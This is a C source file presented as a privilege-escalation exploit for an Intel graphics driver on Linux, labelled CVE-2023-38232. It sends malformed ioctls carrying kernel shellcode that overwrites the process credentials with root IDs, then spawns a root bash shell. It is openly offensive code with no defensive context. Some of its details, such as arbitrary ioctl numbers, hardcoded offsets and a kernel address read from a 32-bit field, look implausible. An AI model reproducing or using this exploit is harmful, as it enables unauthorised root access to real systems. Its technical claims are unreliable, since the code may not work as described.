#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define INTEL_DEVICE_PATH "/dev/dri/card0"
#define INTEL_GRAPHICS_IOCTL 0x6422A4B
#define MAP_SIZE 0x1000

typedef struct {
    uint64_t buffer_addr;
    uint32_t buffer_size;
    uint32_t control_flags;
    uint8_t  payload_data[0x100];
} exploit_payload_t;

// Kernel shellcode for x86_64 Linux that gives root privileges
unsigned char shellcode[] = {
    // Find current task_struct (current)
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00,  // mov rax, gs:[0]
    
    // Overwrite cred structure to get root (uid/gid 0)
    0x48, 0x8B, 0x80, 0xD8, 0x04, 0x00, 0x00,              // mov rax, [rax+0x4d8]
    0x48, 0xC7, 0x40, 0x04, 0x00, 0x00, 0x00, 0x00,        // mov qword ptr [rax+4], 0
    0x48, 0xC7, 0x40, 0x0C, 0x00, 0x00, 0x00, 0x00,        // mov qword ptr [rax+12], 0
    0x48, 0xC7, 0x40, 0x14, 0x00, 0x00, 0x00, 0x00,        // mov qword ptr [rax+20], 0
    0xC3                                                   // ret
};

void* map_shared_memory(int fd, size_t size) {
    uint32_t map_request[4] = {0x1, 0x0, size, 0x0};
    void* mapped_addr = NULL;
    
    if (ioctl(fd, 0x4022000C, map_request) < 0) {
        perror("[-] Failed to map shared memory");
        return NULL;
    }
    
    // Get returned address from map request
    mapped_addr = (void*)(uintptr_t)map_request[1];
    
    printf("[+] Mapped shared graphics memory at %p\n", mapped_addr);
    return mapped_addr;
}

int trigger_vulnerability(int fd, void* mapped_addr, size_t size) {
    exploit_payload_t payload = {0};
    
    // Configure exploit payload
    payload.buffer_addr = (uint64_t)mapped_addr;
    payload.buffer_size = size;
    payload.control_flags = 0xFFFFFFFF;  // Trigger validation bypass
    
    // Copy shellcode to payload buffer
    memcpy(payload.payload_data, shellcode, sizeof(shellcode));
    
    // Add specific pattern to exploit driver's validation flaw
    *(uint64_t*)(&payload.payload_data[0xE0]) = 0xDEADC0DEDEADC0DE;
    
    // Send malformed IOCTL to trigger vulnerability
    if (ioctl(fd, INTEL_GRAPHICS_IOCTL, &payload) < 0) {
        perror("[-] Exploit IOCTL failed");
        return -1;
    }
    
    // Trigger execution of our payload
    if (ioctl(fd, 0x40422C4B, mapped_addr) < 0) {
        perror("[-] Execution IOCTL failed");
        return -1;
    }
    
    return 0;
}

int main() {
    int fd = -1;
    void* mapped_addr = NULL;
    int exploit_result = -1;
    
    printf("[*] Intel Graphics Driver Exploit for CVE-2023-38232 (Linux)\n");
    
    // Open driver device
    fd = open(INTEL_DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("[-] Failed to open device");
        return 1;
    }
    
    printf("[+] Opened Intel Graphics device\n");
    
    // Map shared memory for exploitation
    mapped_addr = map_shared_memory(fd, MAP_SIZE);
    if (!mapped_addr) {
        close(fd);
        return 1;
    }
    
    // Trigger vulnerability and execute payload
    exploit_result = trigger_vulnerability(fd, mapped_addr, MAP_SIZE);
    
    if (exploit_result == 0) {
        printf("[+] Exploit executed successfully\n");
        printf("[+] Current process now has root privileges\n");
        
        // Verify privileges
        system("id > /tmp/exploit_result.txt");
        printf("[+] Check /tmp/exploit_result.txt for privilege verification\n");
        
        // Spawn root shell
        system("/bin/bash");
    } else {
        printf("[-] Exploit failed\n");
    }
    
    // Cleanup
    close(fd);
    return 0;
}